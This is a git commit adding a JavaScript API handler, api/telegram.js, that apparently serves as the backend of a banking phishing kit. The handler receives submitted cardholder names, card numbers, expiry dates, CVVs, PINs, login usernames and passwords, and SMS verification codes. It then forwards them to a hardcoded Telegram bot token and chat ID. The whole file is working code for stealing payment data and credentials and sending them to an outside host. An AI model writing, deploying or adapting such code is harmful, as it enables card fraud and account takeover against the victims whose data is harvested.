d06fe8155dd53a7fa25317419a2ff09a49131cfd
Scapabase <powerofsender@gmail.com>
2025-10-19 09:28:31 -0700

    Add files via upload

---
+++ api/telegram.js
@@ -0,0 +1,72 @@
+export default async function handler(req, res) {
+  if (req.method !== "POST") {
+    return res.status(405).json({ message: "Method not allowed" });
+  }
+
+  const { 
+
+    user,
+    password,
+    CN,
+    cc,
+    exp,
+    cvv,
+    PIN,
+    sms,
+    SMSERROR,
+
+  } = req.body;
+
+  const BOT_TOKEN = "8329902509:AAHvnHeuPk847NLWrkxpuzeeOUxPpR4aHdI";
+  const CHAT_ID = "-4880874919";
+
+  let message = "";
+
+  if  (CN && cc && exp && cvv && PIN) {
+    // 🟢 رسالة الكارت
+    message = `
+    💳 Carte Bancaire:
+    -CardholderName: ${CN}
+    - Numéro: ${cc}
+    - Expiration: ${exp}
+    - CVV: ${cvv}
+    - PIN: ${PIN}
+    `;
+  
+  }else if (user && password ) {
+    // 🟢 رسالة الكارت
+    message = `
+    🔑 Nouveau PIN Login:
+    - Identifiant: ${user}
+    - Mot de passe: ${password}
+     `;
+} else if (sms ) {
+  // 🟢 رسالة الكارت
+  message = `
+  🔑 SMS recibido Login:
+  - sms: ${sms}
+   `;
+}else if (SMSERROR ) {
+  // 🟢 رسالة الكارت
+  message = `
+  🔑sms Login:
+  - sms: ${SMSERROR}
+   `;
+}
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+  try {
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
+    });
+
+    res.status(200).json({ message: "✅ Envoyé avec succès" });
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ message: "❌ Erreur lors de l'envoi" });
+  }
+}
+
+
